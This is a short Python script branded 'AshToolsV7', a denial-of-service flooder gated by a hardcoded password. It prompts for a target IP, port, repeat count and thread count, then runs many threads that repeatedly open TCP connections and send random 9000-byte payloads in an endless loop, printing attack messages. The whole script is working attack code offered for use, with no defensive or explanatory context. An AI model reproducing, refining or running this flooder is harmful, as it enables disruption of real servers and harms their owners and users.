# Tools Usage By : Ash
# Tools Credit By : Ash
# Don't Leak Your Tools Now !!!

# Import Module
import random
import socket
import threading
import os
import time
# Info Tools [ XC Tools]
os.system("clear")
password = input("[+] PASS : ")
if password == "v7":
    print("[+] OPEN TOOLS V7 BY iAsh")
    time.sleep(3)
else :
    print("WRONG PASS!")
    time.sleep(100000000000000000000000000000)
    
os.system("clear")

print("------------------------------------------------")
print("[+] AshToolsV7 ")
print("[+] TOOLS USED BY : Ash")
print("[+] DON'T LEAK THIS SHIT!")
print("------------------------------------------------")
ip = str(input("[/] Enter RDP IP : "))
port = int(input("[/] Enter RDP Port (80/3389)   : "))
times = int(input("[/] Time : "))
threads = int(input("[/] Thread : "))

def run():
    data = random._urandom(9000)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except socket.error:
            s.close()
            print("[!] Attacking By AshToolsV7 DDoS Auto Suspend IP => ",ip," With Port : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()